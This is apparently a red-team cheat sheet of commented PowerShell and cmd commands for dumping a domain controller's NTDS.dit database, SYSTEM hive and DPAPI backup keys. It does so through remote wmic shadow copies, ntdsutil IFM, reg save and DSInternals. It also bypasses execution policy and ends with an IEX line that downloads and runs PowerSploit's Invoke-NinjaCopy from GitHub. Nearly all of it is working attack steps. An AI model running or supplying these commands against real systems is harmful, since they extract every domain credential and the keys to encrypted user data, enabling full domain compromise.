#
# Laundry lists of NTDS shenanigans
#

#
# Housecleaning first
#

powershell -ep bypass
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#
# use wmic to remote procedure call, create shadow, then retrieve with powershell
#

wmic /node:dc01 process call create "cmd /c vssadmin create shadow /for=c: 2>&1 > c:\vss.log 

#
# both of the next two create corrupted instances of the system file and ntds.dit from the dc, hot mess express? 
# but, should probably catch these calls via wmic
#

wmic /node:dc01 process call create "cmd /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2>&1 > C:\vss2.log" 
wmic /node:dc01 process call create "cmd /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\windows\temp\SYSTEM.hive 2>&1 > C:\vss3.log" 

# 
# so, I used the trusted reg binary to create the system file
#

wmic /node:dc01 process call create "cmd /c reg.exe save hklm\system c:\windows\temp\system-reg.save"

#
# then, instead of stupid wmic, run ntdsutil on dc
#

ntdsutil “ac i ntds” “ifm” “create full c:\ifm” q q

#
# powershell copy operation
#

copy \\dc01\c$\Windows\temp\system-reg.save C:\temp\system.hive 
copy '\\dc01\C$\IFM\Active Directory\ntds.dit' C:\temp\ntds.dit 

#
# install dsinternals so we can use them against our local data and then remotely against the DC too
#

install-module -name DSInternals -Force -Confirm:$false
import-module DSInternals
Get-BootKey -SystemHiveFilePath C:\temp\system.hive

#
# will output similar --> 9717c36de43e1a51d9bd57533f26d30a
#

Get-ADDBBackupKey -DBPath 'C:\temp\ntds.dit' -BootKey 9717c36de43e1a51d9bd57533f26d30a | Format-List

#
# next will output keys files in c:\temp\ directory
#

Get-ADDBBackupKey -DBPath 'C:\temp\ntds.dit' -BootKey 9717c36de43e1a51d9bd57533f26d30a | Save-DPAPIBlob -DirectoryPath C:\temp\

# 
# remote DSInternals to retrieve the DPAPI keys
# 

Get-ADReplBackupKey -Domain 'labs.local' -Server dc01 Save-DPAPIBlob -DirectoryPath c:\temp\keys\

#
# use ninja-copy to recover ntds.dit
# which is likely broken, lots of issues with the retrieval (copy \\unc\file via PS works tho)
#

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1')
Invoke-NinjaCopy -Path “c:\windows\ntds\ntds.dit” -ComputerName "dc01" -LocalDestination “c:\temp\ntds.dit”

